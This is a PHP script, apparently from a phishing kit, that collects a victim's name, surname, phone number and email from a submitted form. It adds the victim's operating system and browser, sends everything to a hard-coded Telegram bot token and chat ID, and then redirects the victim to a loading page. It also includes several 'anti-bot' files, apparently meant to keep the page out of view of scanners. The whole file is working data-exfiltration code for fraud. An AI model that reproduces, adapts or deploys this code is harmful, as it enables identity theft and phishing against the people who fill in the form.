<?php
// send_infos_to_telegram.php
include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';

if (!isset($_SESSION['useragent'])) {
    $_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
}

function getOs($USER_AGENT){
    $OS_ERROR = "Unknown OS Platform";
    $OS = array(
        '/windows nt 10/i'      => 'Windows 10',
        '/windows nt 6.3/i'     => 'Windows 8.1',
        '/windows nt 6.2/i'     => 'Windows 8',
        '/windows nt 6.1/i'     => 'Windows 7',
        '/windows nt 6.0/i'     => 'Windows Vista',
        '/windows nt 5.2/i'     => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     => 'Windows XP',
        '/windows xp/i'         => 'Windows XP',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/linux/i'              => 'Linux',
        '/ubuntu/i'             => 'Ubuntu',
        '/iphone/i'             => 'iPhone',
        '/android/i'            => 'Android'
    );
    foreach ($OS as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }
    }
    return $OS_ERROR;
}

function getBrowser($USER_AGENT){
    $BROWSER_ERROR = "Unknown Browser";
    $BROWSER = array(
        '/msie/i'       => 'Internet Explorer',
        '/firefox/i'    => 'Firefox',
        '/safari/i'     => 'Safari',
        '/chrome/i'     => 'Chrome',
        '/edge/i'       => 'Edge',
        '/opera/i'      => 'Opera',
        '/mobile/i'     => 'Mobile'
    );
    foreach ($BROWSER as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}

// Récupération des données du formulaire
$lastName = isset($_POST['lastName']) ? $_POST['lastName'] : '';
$firstName = isset($_POST['firstName']) ? $_POST['firstName'] : '';
$phone = isset($_POST['phone']) ? $_POST['phone'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';

$botToken = "7726379618:AAEKmunbiAyZSH5Rs-oiTdPUHM6p1Xa6Bb4";
$chatId = "8134069302";

// Message à envoyer
if ($lastName && $firstName && $phone && $email) {
    $message = "📝 Informations personnelles reçues :\n\n👤 Nom : $lastName\n👤 Prénom : $firstName\n📞 Téléphone : $phone\n📧 Email : $email\n\n🌐 OS : " . getOs($_SERVER['HTTP_USER_AGENT']) . "\n🌍 Navigateur : " . getBrowser($_SERVER['HTTP_USER_AGENT']);
} else {
    $message = "❌ Aucune donnée complète reçue dans le formulaire infos.";
}

// Envoi du message via Telegram
$sendMessageUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
file_get_contents($sendMessageUrl);

// Redirection après soumission
if ($lastName && $firstName && $phone && $email) {
    header("Location: ../loading.php");
    exit;
} else {
    header("Location: ../loading.php");
    exit;
}
?>
